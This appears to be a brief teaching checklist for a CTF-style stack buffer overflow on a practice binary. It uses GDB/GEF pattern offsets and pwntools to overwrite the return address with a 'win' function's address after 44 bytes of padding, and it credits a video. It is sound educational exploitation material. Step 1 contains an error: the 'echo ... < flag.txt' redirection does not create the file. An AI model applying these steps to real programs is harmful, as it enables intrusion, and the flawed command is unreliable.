###Instructions:
0. Open and show source code.
1. create a dummy flag: echo "Brandon will not usurp" < flag.txt
2. Ensure you're running GEF 
3. gdb ./vuln
4. pattern create 100
5. r
6. paste + enter
7. Discuss Segmentation Fault
8. Look at the EIP/RIP register and copy the string
9. Pattern Offset "XXXX"
10. python
11. from pwn import *
12. 'A'*44
13. disas win
14. p32(the start of win function)
15. r <<< $(echo "44A's+p32winfunc")
###Credit:
https://www.youtube.com/watch?v=0_PxpXcho4Y
